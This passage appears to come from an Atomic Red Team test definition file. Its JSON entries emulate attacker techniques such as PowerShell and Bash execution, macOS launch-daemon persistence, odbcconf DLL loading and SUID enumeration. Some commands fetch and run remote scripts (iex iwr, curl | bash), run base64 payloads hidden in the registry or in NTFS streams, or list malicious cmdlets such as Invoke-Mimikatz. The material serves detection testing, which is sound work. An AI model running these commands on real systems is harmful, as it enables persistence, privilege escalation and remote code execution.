			"command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
			"cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "NTFS Alternate Data Stream Access",
		"auto_generated_guid": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ads_file": {
				"description": "File created to store Alternate Stream Data",
				"type": "string",
				"default": "$env:TEMP\\NTFS_ADS.txt"
			}
		},
		"dependencies": [
			{
				"description": "Homedrive must be an NTFS drive\n",
				"prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n",
			"cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "PowerShell Session Creation and Use",
		"auto_generated_guid": "7c1acec2-78fa-4305-a3e0-db2a54cddecd",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hostname_to_connect": {
				"description": "The host to connect to, by default it will connect to the local machine",
				"type": "string",
				"default": "$env:COMPUTERNAME"
			}
		},
		"dependencies": [
			{
				"description": "PSRemoting must be enabled\n",
				"prereq_command": "Try {\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
				"get_prereq_command": "Enable-PSRemoting\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n"
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "ATHPowerShellCommandLineParameter -Command parameter variations",
		"auto_generated_guid": "686a9785-f99b-41d4-90df-66ed515f81d7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_line_switch_type": {
				"description": "The type of supported command-line switch to use",
				"type": "string",
				"default": "Hyphen"
			},
			"command_param_variation": {
				"description": "The \"Command\" parameter variation to use",
				"type": "string",
				"default": "C"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments",
		"auto_generated_guid": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_line_switch_type": {
				"description": "The type of supported command-line switch to use",
				"type": "string",
				"default": "Hyphen"
			},
			"command_param_variation": {
				"description": "The \"Command\" parameter variation to use",
				"type": "string",
				"default": "C"
			},
			"encoded_arguments_param_variation": {
				"description": "The \"EncodedArguments\" parameter variation to use",
				"type": "string",
				"default": "EA"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations",
		"auto_generated_guid": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"command_line_switch_type": {
				"description": "The type of supported command-line switch to use",
				"type": "string",
				"default": "Hyphen"
			},
			"encoded_command_param_variation": {
				"description": "The \"EncodedCommand\" parameter variation to use",
				"type": "string",
				"default": "E"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments",
		"auto_generated_guid": "0d181431-ddf3-4826-8055-2dbf63ae848b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"encoded_command_param_variation": {
				"description": "The \"EncodedCommand\" parameter variation to use",
				"type": "string",
				"default": "E"
			},
			"command_line_switch_type": {
				"description": "The type of supported command-line switch to use",
				"type": "string",
				"default": "Hyphen"
			},
			"encoded_arguments_param_variation": {
				"description": "The \"EncodedArguments\" parameter variation to use",
				"type": "string",
				"default": "EncodedArguments"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "PowerShell Command Execution",
		"auto_generated_guid": "a538de64-1c74-46ed-aa60-b995ed302598",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"obfuscated_code": {
				"description": "Defaults to: Invoke-Expression with a \"Write-Host\" line.",
				"type": "string",
				"default": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
			}
		},
		"executor": {
			"command": "powershell.exe -e  #{obfuscated_code}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "PowerShell Invoke Known Malicious Cmdlets",
		"auto_generated_guid": "49eb9404-5e0f-4031-a179-b40f7be385e3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Malicious_cmdlets": {
				"description": "Known Malicious Cmdlets",
				"type": "string",
				"default": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n"
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "PowerUp Invoke-AllChecks",
		"auto_generated_guid": "1289f78d-22d2-4590-ac76-166737e1811b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Abuse Nslookup with DNS Records",
		"auto_generated_guid": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "SOAPHound - Dump BloodHound Data",
		"auto_generated_guid": "6a5b2a50-d037-4879-bf01-43d4d6cbf73f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user": {
				"description": "Username for authentication",
				"type": "string",
				"default": "$env:USERNAME"
			},
			"password": {
				"description": "Password for authentication",
				"type": "string",
				"default": "P@ssword1"
			},
			"domain": {
				"description": "Domain for authentication",
				"type": "string",
				"default": "$env:USERDOMAIN"
			},
			"dc": {
				"description": "Domain Controller IP",
				"type": "string",
				"default": "10.0.1.14"
			},
			"cachefilename": {
				"description": "Cache filename",
				"type": "string",
				"default": "c:\\temp\\cache.txt"
			},
			"outputdirectory": {
				"description": "Output directory",
				"type": "string",
				"default": "c:\\temp\\test2"
			},
			"soaphound_path": {
				"description": "Path to SOAPHound binary",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe"
			}
		},
		"executor": {
			"command": "#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "SOAPHound - Build Cache",
		"auto_generated_guid": "4099086c-1470-4223-8085-8186e1ed5948",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user": {
				"description": "Username for authentication",
				"type": "string",
				"default": "$env:USERNAME"
			},
			"password": {
				"description": "Password for authentication",
				"type": "string",
				"default": "P@ssword1"
			},
			"domain": {
				"description": "Domain for authentication",
				"type": "string",
				"default": "$env:USERDOMAIN"
			},
			"dc": {
				"description": "Domain Controller IP",
				"type": "string",
				"default": "10.0.1.14"
			},
			"cachefilename": {
				"description": "Cache filename",
				"type": "string",
				"default": "c:\\temp\\cache.txt"
			},
			"soaphound_path": {
				"description": "Path to SOAPHound binary",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe"
			}
		},
		"executor": {
			"command": "#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Launch Daemon",
		"auto_generated_guid": "03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"plist_filename": {
				"description": "filename",
				"type": "string",
				"default": "com.atomicredteam.plist"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n",
			"cleanup_command": "sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}\nsudo rm /Library/LaunchDaemons/#{plist_filename}\nsudo rm /tmp/T1543_004_atomicredteam.txt\n"
		},
		"attack_technique": "T1543.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Launch Daemon - Users Directory",
		"auto_generated_guid": "6f899f9d-8a8e-4143-89a5-26fc2c3ec438",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"plist_filename": {
				"description": "filename",
				"type": "string",
				"default": "com.atomicredteam.T1543.004.plist"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{path_malicious_plist} ~/Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchDaemons/#{plist_filename}\n",
			"cleanup_command": "sudo launchctl unload ~/Library/LaunchDaemons/#{plist_filename}\nsudo rm ~/Library/LaunchDaemons/#{plist_filename}\nsudo rm /tmp/T1543_004_atomicredteam.txt"
		},
		"attack_technique": "T1543.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Odbcconf.exe - Execute Arbitrary DLL",
		"auto_generated_guid": "2430498b-06c0-4b92-a448-8ad263c388e2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_payload": {
				"description": "DLL to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Odbcconf.exe - Load Response File",
		"auto_generated_guid": "331ce274-f9c9-440b-9f8c-a1006e1fce0b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"rsp_file_name": {
				"description": "Response file name to load",
				"type": "string",
				"default": "T1218.008.rsp"
			},
			"rsp_file_path": {
				"description": "Response file path",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1218.008\\bin\\"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
				"prereq_command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp\" -OutFile \"#{rsp_file_path}#{rsp_file_name}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll\" -OutFile \"#{rsp_file_path}\\o.dll\"\n"
			}
		],
		"executor": {
			"command": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.008",
		"phases": ["defense-evasion"]
	},
	{
		"name": "List Process Main Windows - C# .NET",
		"auto_generated_guid": "fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_source_code": {
				"description": "Path to source of C# code",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1010\\src\\T1010.cs"
			},
			"output_file_name": {
				"description": "Name of output binary",
				"type": "string",
				"default": "%TEMP%\\T1010.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1010.cs must exist on disk at specified location (#{input_source_code})\n",
				"prereq_command": "if (Test-Path \"#{input_source_code}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{input_source_code}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile \"#{input_source_code}\"\n"
			}
		],
		"executor": {
			"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\n#{output_file_name}\n",
			"cleanup_command": "del /f /q /s #{output_file_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1010",
		"phases": ["discovery"]
	},
	{
		"name": "Radmin Viewer Utility",
		"auto_generated_guid": "b4988cad-6ed2-434d-ace5-ea2670782129",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"radmin_installer": {
				"description": "Radmin Viewer installer",
				"type": "path",
				"default": "RadminViewer.msi"
			},
			"radmin_exe": {
				"description": "The radmin.exe executable from RadminViewer.msi",
				"type": "path",
				"default": "Radmin Viewer 3/Radmin.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Radmin Viewer Utility must be installed at specified location (#{radmin_exe})\n",
				"prereq_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{radmin_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading radmin installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{radmin_installer}\"\nWrite-Host Install Radmin\nStart-Process msiexec  -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{radmin_installer}\", /qn\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "\"%PROGRAMFILES(x86)%/#{radmin_exe}\"\n"
		},
		"attack_technique": "T1072",
		"phases": ["execution", "lateral-movement"]
	},
	{
		"name": "PDQ Deploy RAT",
		"auto_generated_guid": "e447b83b-a698-4feb-bed1-a7aaf45c3443",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"PDQ_Deploy_installer": {
				"description": "PDQ Deploy Install",
				"type": "path",
				"default": "PDQDeploysetup.exe"
			},
			"PDQ_Deploy_exe": {
				"description": "The PDQDeployConsole.exe executable from PDQDeploysetup.exe",
				"type": "path",
				"default": "Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})\n",
				"prereq_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading PDQ Deploy installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\"\nWrite-Host Install PDQ Deploy\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\" -Wait -ArgumentList \"/s\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n"
		},
		"attack_technique": "T1072",
		"phases": ["execution", "lateral-movement"]
	},
	{
		"name": "Deploy 7-Zip Using Chocolatey",
		"auto_generated_guid": "2169e8b0-2ee7-44cb-8a6e-d816a5db7d8a",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Chocolatey must be installed to deploy 7-Zip.\n",
				"prereq_command": "if (Test-Path \"${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Downloading Chocolatey installer\nInvoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"\nWrite-Host Installing Chocolatey\nStart-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "# Deploy 7-Zip using Chocolatey\nchoco install -y 7zip\n"
		},
		"attack_technique": "T1072",
		"phases": ["execution", "lateral-movement"]
	},
	{
		"name": "Create and Execute Bash Shell Script",
		"auto_generated_guid": "7e7ac3ed-f795-4fa5-b711-09d6fbe9b873",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"script_path": {
				"description": "Script path",
				"type": "path",
				"default": "/tmp/art.sh"
			},
			"host": {
				"description": "Host to ping",
				"type": "string",
				"default": "8.8.8.8"
			}
		},
		"executor": {
			"command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\"\nsh -c \"echo 'ping -c 4 #{host}' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n",
			"cleanup_command": "rm #{script_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Command-Line Interface",
		"auto_generated_guid": "d0c88567-803d-4dca-99b4-7ce65e7b257c",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n",
			"cleanup_command": "rm /tmp/art-fish.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Harvest SUID executable files",
		"auto_generated_guid": "46274fc6-08a7-4956-861b-24cbbaa0503c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"autosuid": {
				"description": "Path to the autosuid shell script",
				"type": "path",
				"default": "PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"
			},
			"autosuid_url": {
				"description": "Path to download autosuid shell script",
				"type": "url",
				"default": "https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
				"prereq_command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "curl --create-dirs #{autosuid_url} --output #{autosuid}\n"
			}
		],
		"executor": {
			"command": "chmod +x #{autosuid}\nbash #{autosuid}\n",
			"cleanup_command": "rm -rf #{autosuid}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "LinEnum tool execution",
		"auto_generated_guid": "a2b35a63-9df1-4806-9a4d-5fe0500845f2",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"linenum": {
				"description": "Path to the LinEnum shell script",
				"type": "path",
				"default": "PathToAtomicsFolder/T1059.004/src/LinEnum.sh"
			},
			"linenum_url": {
				"description": "Path to download LinEnum shell script",
				"type": "url",
				"default": "https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "LinnEnum must exist on disk at specified location (#{linenum})\n",
				"prereq_command": "if [ -f #{linenum} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "curl --create-dirs #{linenum_url} --output #{linenum}\n"
			}
		],
		"executor": {
			"command": "chmod +x #{linenum}\nbash #{linenum}\n",
			"cleanup_command": "rm -rf #{linenum}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "New script file in the tmp directory",
		"auto_generated_guid": "8cd1947b-4a54-41fb-b5ea-07d0ace04f81",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n",
			"cleanup_command": "rm $TMPFILE\nunset TMPFILE\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "What shell is running",
		"auto_generated_guid": "7b38e5cc-47be-44f0-a425-390305c76c17",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "What shells are available",
		"auto_generated_guid": "bf23c7dc-1004-4949-8262-4c1d1ef87702",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "cat /etc/shells \n"
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Command line scripts",
		"auto_generated_guid": "b04ed73c-7d43-4dc8-b563-a2fc595cba1a",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n",
			"elevation_required": false
		},
		"attack_technique": "T1059.004",
		"phases": ["execution"]
	},
	{
		"name": "Obfuscated command line scripts",
		"auto_generated_guid": "5bec4cc8-f41e-437b-b417-33ff60acf9af",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
